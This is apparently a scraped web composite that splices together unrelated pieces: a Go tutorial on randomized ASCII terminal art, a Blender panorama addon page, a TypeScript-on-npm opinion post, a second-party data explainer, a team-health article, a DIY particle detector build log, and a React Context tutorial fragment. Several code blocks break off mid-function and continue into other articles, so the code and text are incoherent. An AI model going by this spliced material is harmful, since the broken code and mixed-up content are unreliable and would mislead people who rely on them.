<p>Each time you run this music video in the terminal, it’ll be different, because the “frame cleanup” is truly randomized. I’ve spent a while thinking about how to pull this off and went with this:</p>

<ul>
  <li>I’ve prepared nice ASCII art of the last chorus</li>
  <li>Then I’ve formatted it</li>
  <li>Populated the display with <code>:</code></li>
  <li>The randomly destroyed what I need</li>
</ul>

<p>Sounds easy? Once I had figured it out, it actually was! So, let’s take a closer look at the functions:</p>

<blockquote>
  <p>All functions are in chorus_last.go</p>
</blockquote>

<div><div><pre><code><span>func</span> <span>(</span><span>s</span> <span>*</span><span>Sized</span><span>)</span> <span>formatLine</span><span>(</span><span>str</span> <span>string</span><span>)</span> <span>string</span> <span>{</span>

  <span>var</span> <span>pre</span><span>,</span> <span>post</span> <span>string</span>
  <span>for</span> <span>i</span> <span>:=</span> <span>0</span><span>;</span> <span>i</span> <span>&lt;</span> <span>add</span><span>;</span> <span>i</span><span>++</span> <span>{</span>
    <span>pre</span> <span>+=</span> <span>":"</span>
    <span>post</span> <span>+=</span> <span>":"</span>
  <span>}</span>
  <span>f</span> <span>:=</span> <span>pre</span> <span>+</span> <span>str</span> <span>+</span> <span>post</span>
  <span>if</span> <span>len</span><span>(</span><span>f</span><span>)</span> <span>!=</span> <span>s</span><span>.</span><span>width</span> <span>{</span>
    <span>f</span> <span>=</span> <span>f</span><span>[</span><span>:</span><span>len</span><span>(</span><span>f</span><span>)</span><span>-</span><span>1</span><span>]</span>
  <span>}</span>

  <span>return</span> <span>f</span>
<span>}</span>
</code></pre></div></div>

<p>As each display will be different, the art needs to be formatted - which basically means adding <code>:</code> at the beginning and the end until the whole width of the display is used.</p>

<div><div><pre><code><span>func</span> <span>(</span><span>s</span> <span>*</span><span>Sized</span><span>)</span> <span>generateLine</span><span>(</span><span>char</span> <span>string</span><span>)</span> <span>string</span> <span>{</span>

<h2>What it is:</h2>







<div>
<div>
<div><p>The PanoCamAdder is a small addon for Blender.</p><p>It is helpfull to create 3D models from equirectangular panoramas.</p></div>
</div>



<div>
<figure><img src="https://der-mische.de/wordpress/wp-content/uploads/2020/09/PanoCamAdder-CAM.jpg" alt="" srcset="https://der-mische.de/wordpress/wp-content/uploads/2020/09/PanoCamAdder-CAM.jpg 472w, https://der-mische.de/wordpress/wp-content/uploads/2020/09/PanoCamAdder-CAM-282x315.jpg 282w" sizes="(max-width: 472px) 100vw, 472px"></figure>
</div>

<div>
<p>Download it for free from here:</p>




</div>



<p><strong>It does three things for you:</strong></p>



<ul><li>It adds a 360°-viewer camera setup.</li><li>It creates a Material with a panorama-texture node.</li><li>It creates a World setup with a desaturated panorama for the background.</li></ul>



<p><strong>You can add multiple PanoCams, Materials and Worlds to each file!</strong></p>



<p>That’s all… </p>



<p>But it is not needed more, to use 360° Panoramas as reference to create a 3D model!</p>



<hr>



<h2>For what is it usefull?</h2>







<p>You can use all the features of Blender to create different things with the model later on.</p>



<p>Use texture-baking to create beautiful <strong>dollhouses</strong> or scenes for a <strong>game engine</strong>.</p>



<p>You can export the model also as STL file, to use it inside <strong>KRpano</strong> as Depthmap. But therefore you must prepare it manually before (tutorial is coming soon).</p>



<h2>How it works:</h2>







<div>
<p>Enter a name for your panorama and press the „Add PanoCam“ button.</p>



<div>
<figure><img src="https://der-mische.de/wordpress/wp-content/uploads/2020/09/PanoCamAdder-panel.jpg" alt="PanoCamAdder panel"></figure>
</div>
</div>



<p>This will create:</p>



<ul><li>A Material „<strong>PanoName_MAT</strong>„</li><li>A World „<strong>PanoName_WORLD</strong>„</li></ul>



<p>And it adds three objects to the scene:</p>



<ul><li>A camera „<strong>PanoName_CAM</strong>„</li><li>An emty „<strong>PanoName_EMPTY</strong>„</li><li>And another empty „<strong>PanoName_ROT</strong>„</li></ul>



<p><strong>The „PanoName_EMPTY“ is the mainhandle for the camera-location and the panorama-rotation.<br>Move it to position the camera, rotate it to turn the panorama.</strong></p>



<div><p>The „PanoName_CAM“ is the 360°-Viewer for the current panorama. Press NumPad-0 to activate the camview, hold and drag the middle mouse button to look around. <br>If you use more than one PanoCam in your scene, you must activate different cameras for each window. Go to the VIEW tab, tick „use local camera“ and select a camera from the dropdown menue.</p><p>The „PanoName_ROT“ is needed for the world-setup. Just leave it where it is and ignore it. 😉</p></div>



<hr>



<h2>Start modelling</h2>







<p>To start modelling, add a plane to the scene and apply the „PanoName_MAT“. Load your panorama to the Material. Keep sure the plane is at (0/0/0) and move the „PanoName_EMPTY“ to the corecct camera-height (very important!)<br>If you wanna see a desaturated panorama in the background, select the „PanoName_WORLD“ in the World settings.<br>Activate Viewport-Shading to make the Material visible. Tick Scene-World to make the background-panorama visible, too.</p>



<p>As you can see, you need more Blender knowledge for this one.<br>So I recoment you to learn some Blender basics first!</p>



<p>Everything, the camera height for example, must be set up manually. There is neither a „Make ExportReady“ button.. If you wanna use the 3D model for KRpano, you must prepare it manually.</p>



<p><strong>If you are totaly new to Blender, it is maybe better to start with the <a href="https://der-mische.de/panoblender/">PanoBlenderAddon</a>.<br>On the other side, you can also use the PanoCamAdder  to learn Blender with it.</strong></p>



<hr>



<h2>What’s next?</h2>







<div><p>For now I wanna do more tests with the PanoCamAdder. <br>I will try to find an easy workflow to prepare the model(s) for using it with KRpano.</p><p>I will try to create an additional Mask-Material. This could be helpfull, if you wanna bake multiple panorama-textures and layer them in Photoshop or any other image-editing application later on.</p><p>Anyway, I think this is a good startpoint for a new PanoBlenderAddon version.</p></div>

September 1, 2020 | https://timdaub.github.io/2020/09/01/typescript/ | <a href="https://web.archive.org/web/*/https://timdaub.github.io/2020/09/01/typescript/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p>In recent months, I've noticed a dramatic increase in TypeScript packages on GitHub. I usually come across them when checking repositories of the people I follow like. Or, when I'm looking for dependencies to solve a problem in my projects. And the more TypeScript packages I'm encountering, the more often I get reminded of this little annoyance towards the project.</p>
<p>My context is that I've not looked into TypeScript yet. That means I have no idea how it works. Unfortunately, this is now starting to become kind of a problem when searching for dependencies. It does, when I either willingly or accidentally include a TypeScript package into my projects. Mainly because my package-choosing criteria include:</p>
<ul>
<li>picking packages that I potentially can contribute to (e.g., a lesser-known package that contains well-written code); or</li>
<li>picking packages that are well-maintained by a large community but may include code that I'd not be able to easily contribute to (e.g., a popular package using a C library internally)</li>
</ul>
<p>I've put these criteria in place willingly to achieve a certain quality standard when building applications. Either because I can fix bugs myself quickly, or because I'm able to rely on a strong community to fix them. However, with TypeScript packages in npm, there's now this opaque problem of not knowing the language or quickly telling a package's language and its community size. Also, TypeScript could be just another CoffeeScript.</p>
<p>So essentially, the problem is that TypeScript authors publish their packages on npm, the package manager for Node.js. And to me, that's what is weakening the JavaScript ecosystem. Since its inception, and throughout trends like Coffeescript, npm has mostly held the promise of only hosting JavaScript packages. However, this promise is <code>rejected()</code> (lol) by many authors publishing their TypeScript-to-JavaScript transpiled packages.</p>
<p>Indeed, it makes sense considering that Microsoft markets TypeScript as a "superset of JavaScript" and since it "compiles" to JavaScript, why not publish packages to npm? But in terms of equality and identity, TypeScript is not JavaScript. After all, you'd not consider C and Objective-C the same either, or would you? In both examples, the languages are subsets/supersets but were conceived with different goals in mind to solve other problems.</p>
<p>Therefore, TypeScript authors should, in my opinion, do something along the following lines:</p>
<ul>
<li>namespacing their TypeScript packages; or</li>
<li>build and publish their packages to their package manager.</li>
</ul>
<p>However, continuing to publish TypeScript packages to npm is, in my opinion weakening the JavaScript ecosystem as it's splitting its community and polluting the npm namespace.</p>
<h2 id="controversy">Controversy</h2>
<ul>
<li>For a short time, there was an <a href="https://news.ycombinator.com/item?id=24344506" target="_blank" rel="noopener">intense conversation</a> on Hacker News. But for unknown reasons, my post got marked as <code>[flagged]</code>. I've written an email to the operators.</li>
</ul>

<![CDATA[Second-Party Data]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

		<div>

			
<p>In brief, second-party data is essentially customer data, directly purchased from the initial data collector, which is why it’s frequently referred to as the so-to-speak “someone else’s first-party data.”</p>



<p>Similarly to 1st-party data, 2nd-party data frequently includes information about people’s website / app usage, social media activity, as well as customer survey results.&nbsp;</p>



<p>Upon a purchase, such <a href="https://www.iab.com/wp-content/uploads/2018/12/IAB_Defining-the-Data-Stack_2018-12-05_Final.pdf" target="_blank" rel="noreferrer noopener">data sets</a> are usually merged with brands’ first-party data, primarily for audience targeting purposes.&nbsp;</p>



<h4><strong>Third-party vs Second-party Data&nbsp;</strong></h4>



<p>While third-party data basically implies purchasing of data segments, initially obtained from various publishers across the Web, indirectly, i.e. via data aggregators/data brokers, second-party data requires direct deals with first-party data collectors.</p>



<p>This difference actually explains why second-party data deals have gained traction over the past several years.&nbsp;</p>



<p>The thing is, not only is 3rd-party data non-exclusive and often poorly-converting, the lack of transparency on consent verification for the syndicated data collection can in fact result in a buyer’s being held legally accountable for privacy law (e.g. GDPR or CCPA) violations.&nbsp;</p>



<p>At the same time, 2nd-party data unlocks brands’ access to the high-quality niche data, which is more accurate, more precise and, certainly, more transparent in terms of collection.&nbsp;</p>



<h4><strong>Benefits of Second-party Data</strong></h4>



<p>From a brand’s perspective, obtaining 2nd-party data may be an essential step towards developing an efficient marketing strategy, i.e. scaling their customer data analysis, hence expanding audience reach and improving behavior predictions.</p>



<p>From a publisher’s perspective, second-party data deals unlock yet another source of incremental revenue for content creators, while keeping their audience data protected in a policy-controlled environment.</p>



<h4><strong>Potential Challenges with Second-party Data</strong></h4>



<p>While 2nd-party data deals can foster trust and collaboration between businesses on the supply and demand side, this is only possible in case no competition or any other conflict of interest between the parties is involved.&nbsp;</p>



<p>Another potential challenge for marketers is to ensure continuous quality control of the data obtained from the seller, while keeping it scalable enough to reach their business goals.</p>

<p><strong>Team Health is the most important KPI for dev leads. Monitor these vital signs during your iteration to identify problems early and prevent developer burnout.</strong></p>







<figure><img src="https://linearb.io/wp-content/uploads/2020/08/1-DevTeamHeatlh-1024x488.png" alt="" srcset="https://linearb.io/wp-content/uploads/2020/08/1-DevTeamHeatlh-1024x488.png 1024w, https://linearb.io/wp-content/uploads/2020/08/1-DevTeamHeatlh-300x143.png 300w, https://linearb.io/wp-content/uploads/2020/08/1-DevTeamHeatlh-768x366.png 768w, https://linearb.io/wp-content/uploads/2020/08/1-DevTeamHeatlh.png 1386w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>







<p>Many of us in software are working longer and harder than ever before. Being at home all day, every day, is blurring the lines between work and home life. On one hand, this work from home experience is wholesome and humanizing. Seeing your boss holding a newborn or wrestling with a curious five year old during product strategy meetings adds a new perception and understanding to the workplace. Something that was often not found in the workplace. Unfortunately the same coin has another side.&nbsp;</p>



<p>As family life blends into worklife, the opposite is happening as well. It’s all too easy to get pinged on slack after dinner and say “I’ll just send that over real quick.” No one wants to be the blocker afterall. This type of always-on mentality is something that many companies are learning to combat because it is unhealthy and a leading indicator of bigger issues down the road.</p>



<p>Keeping the teams pulse at your fingertips is one of the necessary challenges of the team lead.</p>



<p>In a lot of ways the team’s pulse is something that is felt, an intuition if you will. In other ways it is something that can be measured, like work output changes. Great leaders work hard to combine their intuition with quantitative data, providing them with powerful insights into their teams.&nbsp;</p>



<p>I’m not sure I can help you feel the pulse of your team, but I can share the quantitative data I watch at a team and individual level that helps me identify unhealthy behaviors before they become larger issues.&nbsp;</p>







<h2><strong>Top Development Team Health Indicators to Watch:&nbsp;</strong></h2>



<ul><li>Consecutive Days Worked</li><li>Number of Open Tasks per Team Member&nbsp;</li><li>Unfocused Work&nbsp;</li><li>High levels of Rework</li><li>Number of bugs/fire drills per Iteration&nbsp;</li><li>Team Members Acting Out of Character</li></ul>







<h3><strong>Consecutive Days Works</strong></h3>



<p>At LinearB we run 2 week sprint cycles, meaning my team has 10 good working days to accomplish our sprint goals. At larger companies with hundreds of developers, seeing developers log on 11 out of the 14 days might be the norm. This includes being on-call during a sunday night merge or answering a quick slack message on a Saturday.&nbsp;</p>



<p>At smaller companies who employ only a handful of developers, all of which are all at home all day, it’s much more regular to see 12, 13, 14 days logged in per sprint. This is okay during some sprints, big launch weeks for example, but when my lead developer is working at least some of every day for multiple sprints, that is unhealthy.&nbsp;</p>

<p>Consecutive days worked is a leading indicator of team member health. It is the job of the team lead to step in and be the responsible people manager. It’s like putting a 7 year old to bed, they are tired, you know they are tired, but they fight it anyways. If tomorrow is going to be a good day, we need to disconnect, mentally and physically. If you see your people working consecutively, if you find yourself working consecutively, start enforcing mandatory downtime.&nbsp;&nbsp;</p>







<h3><strong>Number of Open Tasks Per Team Member</strong></h3>



<p>Work balance across development teams has gotten much better over the years. As a team lead myself, I take an active role in knowing what everyone is working on and making sure our more experienced developers aren’t taking on more than they should be.&nbsp;</p>



<p>On the LinearB development team we flag anyone who has more than six tasks open at any one time. What does the flag mean? It means I need to take some time to listen.&nbsp;</p>







<figure><img src="https://lh3.googleusercontent.com/HhnBNyuucwSW4izcb67TqIob-muhIgydmmJFZnAKQywAho1TjxqFjwoS0inGjESzsxCTPW-wyHsucNKlPmjuH1c-Knxc51JkfCleTea78xzP5RWD3TM_k7dLVzEcMPnPK2SaTijF" alt=""><figcaption>LinearB’s Custom Workflow Alerts</figcaption></figure>







<p>There may be a good reason why Oriel has 6 active branches right now, or it might mean that I haven’t provided Miki with the right priorities. Either way, knowing the number of open tasks everyone is working on allows me to open a dialogue and keep my team balanced.&nbsp;</p>



<p>To keep your team members healthy, stop using individual velocity as a KPI, focus instead on providing the right priorities and keeping the work balanced across your whole team.</p>







<h3><strong>Unfocused Work</strong></h3>



<p>Similar to having too many open tasks, team members who aren’t focusing their efforts on solving one problem before another is a leading indicator of developer burnout. If we take Oriel as the example again, we can see that he is spread across 4 different open tasks and 4 completely different areas of focus. It’s going to be hard for him to immerse himself in any of those problems if he is constantly switching contexts.&nbsp;</p>







<figure><a href="https://linearb.io/demo/"><img src="https://linearb.io/wp-content/uploads/2020/08/Screen-Shot-2020-08-27-at-9.02.12-AM-1-1024x507.png" alt="" srcset="https://linearb.io/wp-content/uploads/2020/08/Screen-Shot-2020-08-27-at-9.02.12-AM-1-1024x507.png 1024w, https://linearb.io/wp-content/uploads/2020/08/Screen-Shot-2020-08-27-at-9.02.12-AM-1-300x149.png 300w, https://linearb.io/wp-content/uploads/2020/08/Screen-Shot-2020-08-27-at-9.02.12-AM-1-768x381.png 768w, https://linearb.io/wp-content/uploads/2020/08/Screen-Shot-2020-08-27-at-9.02.12-AM-1-1536x761.png 1536w, https://linearb.io/wp-content/uploads/2020/08/Screen-Shot-2020-08-27-at-9.02.12-AM-1-2048x1015.png 2048w" sizes="(max-width: 1024px) 100vw, 1024px"></a><figcaption>LinearB Team Pulse View</figcaption></figure>







<p>Another way to identify unfocused inefficient work is to look at the type of output coming from developers who are spread thin. If someone like Oriel, who is often providing several PR reviews a week, hasn’t participated in any reviews during this sprint, I can infer that his time is being taken up in other areas – meetings, support tickets, bugs, etc. While day-to-day operations like these are important, it’s also crucial to make sure your team members have enough time to block out the business and zone in on solving a single problem.&nbsp;</p>



<p>Identifying people on your team who are spread across several focus areas is an excellent way to prevent developer burnout. Help your people by communicating their priorities and asking what they need so they can focus without switching context.&nbsp;</p>

<p>Time Investment Profile</p>



<div><figure><img src="https://linearb.io/wp-content/uploads/2020/08/Screen-Shot-2020-08-27-at-9.04.56-AM-1-1024x688.png" alt="" srcset="https://linearb.io/wp-content/uploads/2020/08/Screen-Shot-2020-08-27-at-9.04.56-AM-1-1024x688.png 1024w, https://linearb.io/wp-content/uploads/2020/08/Screen-Shot-2020-08-27-at-9.04.56-AM-1-300x202.png 300w, https://linearb.io/wp-content/uploads/2020/08/Screen-Shot-2020-08-27-at-9.04.56-AM-1-768x516.png 768w, https://linearb.io/wp-content/uploads/2020/08/Screen-Shot-2020-08-27-at-9.04.56-AM-1.png 1208w" sizes="(max-width: 1024px) 100vw, 1024px"></figure><p>LinearB’s time investment profile is the quickest way to visualize how time was spent across different ticket types.

<h3><strong>High Levels of Rework</strong></h3>



<p>Frustration is a keen emotion felt by everyone. It often reminds me of fire. It can build up and explode. Or it can be so subtle you don’t even recognize it until it’s a bigger issue. And the best antidote for both is to identify it early and snuff it out. High levels of rework during your sprint is a leading indicator of team frustration. Frustration within your team is scary, because like fire, it can spread very quickly.&nbsp;</p>



<p>A high level of rework during your sprint is often a symptom of misalignment between product and development. It’s an age old story, product says A, development starts working, and three days later, product makes changes to the requirements. Rework due to vague or changing requirements causes frustration for whoever is trying to build the feature.&nbsp;</p>







<figure><a href="https://linearb.io/demo/"><img src="https://lh3.googleusercontent.com/uz-hvE8LkEzs8dyOoaZMQwWtgQPmsH-kwqI29m7hDzsUGhYzVB9yj7Q160E7kY6qDPwF04wPHo9pF-9HQmvzVsgvB-e2We53gxgk71q96QZN8sEiyBu6L2KjPP2_B4mDZJYjvgJi" alt=""></a><figcaption>LinearB’s Work Breakdown Per Iteration</figcaption></figure>







<p>Another way to check for misalignment between product and your dev team is to look at the time between when requirements are finished and the first commit. If that is a short time span, you can infer that your team members trust the product team because the product team has provided enough context for developers to understand why something is being built.&nbsp;</p>



<p>Healthy development teams have a transparent relationship with their product manager.&nbsp;</p>







<h3><strong>Number of Bugs/fire drills per Iteration</strong></h3>



<p>Working on new stuff is fun. You get to explore, discover, and accomplish something different. Working on bugs, fire drills, and support tickets might be seen as less exciting, especially by younger developers. Teams who are working on bugs and support more than 80% of the time tend to get bored and envious of other teams, leading again to our fiery friend frustration.&nbsp;</p>



<p>It’s good to keep an eye on the amount of new work vs refactoring vs bugs during your team’s iteration, and at an individual level. Too much of the latter can be a symptom of much larger code quality issues or headaches that cause stress among the team. Team health is optimized when refactor, bug, and new work is balanced throughout the team.&nbsp;</p>







<figure><a href="https://linearb.io/demo/"><img src="https://lh4.googleusercontent.com/Yg29YSHot-tg4OQLWixNK6tdf2RCqKKatWB6OdKK3DMq5R2yKYS9WbuO2upk5jQwr4DYaLsR8yogXFw2Qjjxwrk3Y-lInekgvAxrTRJextN4ViJBVkrnlLsXUF0LJNKkVGQ0wxXX" alt=""></a><figcaption>LinearB Time Investment Profile</figcaption></figure>







<p>Another way to combat a high amount of bug work is to ask your developers what else they are interested in and try to give them time throughout the sprint to explore the idea. People produce their best work when they are interested in what they are doing.&nbsp;</p>







<h3><strong>Acting Out of Character</strong></h3>



<p>Our final top dev team health indicator to watch is more subjective. People management is hard, and only harder now with everyone distributed. Our 2d world leaves out a lot of the context we as humans have become accustomed to when interacting with each other. But as a team leader, I have to try.&nbsp;</p>



<p>Acting out of character can take a lot of different forms, and it’s the job of the team lead to identify when it’s happening. If someone who normally speaks a lot is all of a sudden quiet during stand up, or the type of work someone usually does has changed significantly, are a couple examples I’ve seen. If you can identify a behavior change, my best advice is to engage that person directly and ask what’s up. Maybe it’s frustration, or home life, or conflict within the team. Whatever the reason, it is the team leader’s responsibility to listen, understand, and lend your resources where you can.&nbsp;</p>







<h3><strong>Tips for Mitigating Dev Team Health Risks</strong></h3>







<h4>1. Give People Tactical Time To Explore</h4>



<p>I like to ask my team members directly what they are interested in working on. What has been triggered in their brain lately. So other teams I know give an 8 hour allotment per sprint to each dev to work on something they are interested in. However you go about doing it, giving people some freedom to explore and discover on their own will almost assuredly make your team happier.&nbsp;</p>







<h4>2. Use Tools That Track Team Vital Signs&nbsp;</h4>



<p>While team leaders most assuredly keep track of their team’s health, it is always helpful to apply tools, automation, and data to provide early identifiers.

	<p><img width="2048" height="1536" src="https://clanhouse.com/wp-content/uploads/2020/09/IMG_0947.jpeg" alt="CERN DIY electron detector and connected laptop" loading="lazy" srcset="https://clanhouse.com/wp-content/uploads/2020/09/IMG_0947.jpeg 2048w, https://clanhouse.com/wp-content/uploads/2020/09/IMG_0947-1024x768.jpeg 1024w, https://clanhouse.com/wp-content/uploads/2020/09/IMG_0947-768x576.jpeg 768w, https://clanhouse.com/wp-content/uploads/2020/09/IMG_0947-1536x1152.jpeg 1536w" sizes="(max-width: 2048px) 100vw, 2048px"></p><p>What do you do when you’re stuck at home with a 16-year-old son during a pandemic lockdown? Well, the first answer is that you build a gaming PC. That was a good project with a lot of incentives to complete, but that also meant it was soon over.  So, what next? I spotted a post about an outreach project from CERN to <a rel="noreferrer noopener" href="https://github.com/ozel/DIY_particle_detector" target="_blank">build your own particle detector</a> for under £30. Sounded like fun, so here’s how we got on.</p>



<p>Firstly, a bit about ourselves: I’ve just retired from an IT architecture role at a major UK bank, a brave decision when you still have a child at secondary school and there’s a global pandemic looming. My son, Sam, has just completed his GCSEs and is about to enter the sixth form.  I have a degree in Physics and Sam has a keen interest in scientific things. We both suffer from hypermobility of the finger joints, meaning that we have limited fine motor skills (translation: we are both klutzes. Even klutzes can successfully build this detector.) I haven’t picked up a soldering iron in anger for a long time and Sam has only done two or three connections for a school project so we are effectively total noobs to this sort of project.</p>



<p>Anyway, here is a write-up of our experience and lessons learned rfom building the electron detector. If you’re planning on building one yourself then you may find this useful</p>



<h2>Buying the components</h2>



<p>The great thing about the CERN kit is that you can order most of the parts easily using <a rel="noreferrer noopener" href="https://kitspace.org/boards/github.com/ozel/diy_particle_detector/electron-detector/" target="_blank">kitspace</a>. Can you really build it for under €30 (about £27) as claimed? Well, yes and no. The exchange rates have all moved, which doesn’t help. The individual components certainly cost less than €30 but you cannot just buy individual components. You have to buy 10 resistors at a time but they are dirt cheap and you’ll just end up spending 30p instead of 3p for the parts you need. The biggest surprise was that you have to buy a minimum of three circuit boards, but this turned out to be a blessing in disguise. It’s handy to have a spare board if your soldering skills are questionable, plus the alpha detector variant uses the same board so you have an incentive to build that model too. All-in-all, the cost of all the electronic components same to just under £40. If you were buying for a class project – a dozen or so boards – I think the bulk  price would be closer to £33/€37 per board.</p>



<p>There are some optional costs too that you may want to take into account. We bought a BNC to audio jack cable for about £8 on Amazon as this was quicker, easier and ultimately cheaper than building one from scratch. We also had to buy some tools that we needed but didn’t have in our existing toolbox. You may prefer to buy a metal case or project box for around £6, however I would recommend using an old sweet tin or similar. We used a presentation case off a Fossil watch that my wife received one Christmas.  To mount the board in the case, you’ll need some sort of metal standoff. We bought a box of M3 brass standoffs of assorted lengths with all the necessary screws and bolts for about £11 on Amazon. (120 components when you need only one!) You’ll also need some small lengths of connecting wire – about 30cm in total. (Tip: Amazon Prime is well worth the cost if you need to order all these things as you go along.)</p>



<p>Finally, you are going to need some sort of radioactive source to try out the detector. We bought 100g of analytical quality <a href="https://en.wikipedia.org/wiki/Potassium-40" target="_blank" rel="noreferrer noopener">potassium chloride</a> (KCl) on Amazon for under £5. This is a better price than that of the potassium-rich salt substitutes that are also on Amazon and has a higher proportion of potassium to boot.</p>



<h2>Tools that you’ll need</h2>



<figure><img loading="lazy" width="2048" height="1536" src="https://clanhouse.com/wp-content/uploads/2020/09/IMG_0949.jpeg" alt="" srcset="https://clanhouse.com/wp-content/uploads/2020/09/IMG_0949.jpeg 2048w, https://clanhouse.com/wp-content/uploads/2020/09/IMG_0949-1024x768.jpeg 1024w, https://clanhouse.com/wp-content/uploads/2020/09/IMG_0949-768x576.jpeg 768w, https://clanhouse.com/wp-content/uploads/2020/09/IMG_0949-1536x1152.jpeg 1536w" sizes="(max-width: 2048px) 100vw, 2048px"></figure>



<p>Before you start, make sure that you have all the tools that you’re going to need, Here’s a list of what we found necessary:</p>



<ul><li>A soldering iron with a small tip suitable for the components and board</li><li>A de-soldering pump and braid for when you mess things up</li><li>Small cutting pliers for tidying up excess wires when you’ve soldered a component</li><li>Wire strippers for the ends of the connecting wires</li><li>A small multi-meter for testing joints and checking the board</li><li>A nail punch to make holes in your old tin box</li><li>A file to file down the sharp edges on the holes that you’ve just punched</li><li>Some things to hold the board and components in position while you solder them. We used an old wall tile and a hexagonal pencil.</li></ul>



<h2>Constructing the detector</h2>



<p>We spent about three elapsed hours over about 3 weeks building the board and maybe another hour building the case and mounting the board into it. Why so long? Well, this project didn’t have the same appeal to a 16 year old as does building a gaming PC. Plus, use of said gaming PC frequently took priority over this project. We decided to solder the components in groups, doing the resistors first, then the capacitors then the semiconductors. The build instructions in the wiki are pretty good and easy to follow. </p>



<p>We tested every joint as we soldered it, making sure to test from another point on the circuit board so as to prove the connection was good. My son did all the soldering on one of the PCBs. I started work on a second board partly as a backup and partly to have something that could form the basis of the alpha detector. (I discovered the hard way that the two variants begin to differ at the third component, R3!)</p>



<p>Here are some shots of the board at different stages of construction:</p>

<h3>Stage 4</h3>

<h2>Testing the detector</h2>



<p>The first thing to do when testing the detector was to make sure that there were no shorts by measuring resistance across the power connectors. (Tick! A satisfactory 9.8 kilo-ohms) and make sure that power was reaching the board. Then we plugged it into a PC and switched it on. We were using the pulse detector JavaScript to check that it was working. I flicked the switch and…nothing. So, we examined the board. We knew we were novice constructors and some of the joints looked potentially to be dry and on one or two others we could not be 100% sure that we had an air gap between adjacent joints so we de-soldered and remade about 3 joints. Again we connected to the PC and we saw the satisfying pulses when the device was turned on and off. We also saw quite a bit of microphony being picked up when the tin was moved or when one of us spoke near it.</p>



<p>Ok, so next step was to try it with a radiation source. I weighed out roughly 10g of KCl into a plastic lid and positioned it under the diodes in the detector. We hadn’t made a radiation window in the lid of the tin and the diodes were about 1.5cm above the surface of the KCl. I switched on the detector and…nothing, not even the on/off pulses. The detector seemed dead.  I took the device apart and retested very connection with the multi-meter and made sure all the case connections were good and that the case was properly wired to earth. I checked that power from the battery was reaching all the necessary parts and that the battery power was good. I could find nothing wrong. </p>



<p>It quickly became apparent that there was an intermittent problem. Sometimes, the JavaScript detector would see a pulse when the device was switched on or off and sometimes – usually – there was nothing. Sometimes you would see noise on the web oscilloscope and sometimes not. I was scratching my head as to what the problem was. Eventually, it occurred to me to try actually listening to the audio output, a trivial thing to do under Windows. BINGO! I could hear white noise when the device was switched on and, just audible over the noise, a soft click every 20-30 seconds. Clearly the detector was working and therefore what I was facing was a software problem.</p>



<h2>The importance of sound cards, and repurposing yet again an ancient laptop</h2>



<p>I have to say that <a rel="noreferrer noopener" href="https://github.com/ozel" target="_blank">Oliver Keller</a> was an enormous help while I was trying to get the detector working and I cannot stress enough how important it is to listen to his advice about audio connections and sound cards. The problem seems to be that sound cards (or chips) in modern PCs are too clever for their own good. They are designed to optimise microphone input for Skype and Zoom and that means removing the noise and extraneous clicks that are exactly the signal that the detector puts out. </p>



<p>Modern technology was assuming the detector signal was unwanted noise so I needed some primitive technology. I have an old notebook laptop, an Asus EeePC 901. I bought this about 10 years ago and it has been the subject of several hobbyist projects over the years. I upgraded it’s memory to 2GB. I replaced it’s laughably small 4GB SSD with a 32GB one.  I upgraded it from Windows XP Home, via several versions of Ubuntu, to Windows 10 Home. You may be surprised that such a machine can run Windows 10 and MS Office but it can do so, just not well. I backed it up (virtualized it for VMWare) and installed a fresh copy of Lubuntu. I fired up the web oscilloscope under FireFox and now I have a working detector:</p>



<figure><img loading="lazy" width="1024" height="600" src="https://clanhouse.com/wp-content/uploads/2020/09/2020-09-01-105609_1024x600_scrot.png" alt="" srcset="https://clanhouse.com/wp-content/uploads/2020/09/2020-09-01-105609_1024x600_scrot.png 1024w, https://clanhouse.com/wp-content/uploads/2020/09/2020-09-01-105609_1024x600_scrot-768x450.png 768w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>You can quite clearly see a detector pulse in the screenshot. The noise sometimes peaks and can give a false reading but these are fairly easy to spot. The false pulses are one sided and lack the rebound peak of a true pulse. From around 25g of KCl, I’m seeing two or three pulses per minute in the detector</p>



<h2>So what comes next?</h2>



<p>OK, now that the detector is working, what comes next? Our first plan is to try out the python script to make sure that we can see and correctly analyze the energy spectrum from the KCl.  Step three will be to try various things to reduce the electrical noise. I have a suspicion that the tin leaks a little light into its interior but that can be remedied with black tape. Step three will be trying out various samples from my small mineral collection in the …</p></div></div>

<span>}</span></code></pre></div><p>Please note the <code>value</code> prop on <code>&lt;ShopContext.Provider&gt;</code>: The value you set here is forwarded to the wrapped child components. And if the <code>value</code> changes, it will also change in the child components.</p><p>The fact that updates to the data passed to <code>value</code> are received by consumers of our Context and allow us to use the Context API as a global state management tool.</p><p>For that, let’s first of all have a look at how other components can consume context. We got two options:</p><h2>3.1 Using Context.Consumer</h2><div data-language="jsx"><pre><code>
<span>import</span> ShopContext <span>from</span> <span>'../context/shop-context'</span>

<span>class</span> <span>ProductsPage</span> <span>extends</span> <span>Component</span> <span>{</span>

                <span>return</span> count <span>+</span> curItem<span>.</span>quantity
              <span>}</span><span>,</span> <span>0</span><span>)</span><span>}</span></span>

<span>      </span><span><span><span>&lt;/</span><span>ShopContext.Consumer</span></span><span>&gt;</span></span>
    <span>)</span>
  <span>}</span>
<span>}</span>

<span>export</span> <span>default</span> ProductsPage</code></pre></div><p><code>&lt;ShopContext.Consumer&gt;</code> is a wrapper component we can use to “inject” the Context provided in some parent component (doesn’t have to be the immediate parent) in this child component.</p><p>The <code>context</code> is received as an argument to a function which you pass as a direct child to <code>&lt;ShopContext.Consumer&gt;</code>. That’s important! You don’t (directly) place JSX between <code>&lt;ShopContext.Consumer&gt; ... &lt;/ShopContext.Consumer</code>.</p><p>The <code>context</code> object is the exact same object passed to <code>value</code> on our <code>&lt;ShopContext.Provider&gt;</code> - this means that when the data passed to <code>value</code> changes, the <code>context</code> object in the child component also changes and hence this child component updates. That’s a nice form of updating different components based on some centralized state.</p><h2>3.2 Using static contextType</h2><p>Besides using <code>&lt;ShopContext.Consumer&gt;</code>, we can also get access to our Context by setting a static property in our (class-based) child component. Important: Unlike <code>&lt;ShopContext.Consumer&gt;</code>, which you can use in functional <strong>and</strong> class-based components, this method will only work in class-based (“stateful”) components!</p><p>Side note: With <a href="https://academind.com/learn/react/react-hooks-introduction">React Hooks</a> you also got a way of tapping into Context anywhere in functional components, too. See <a 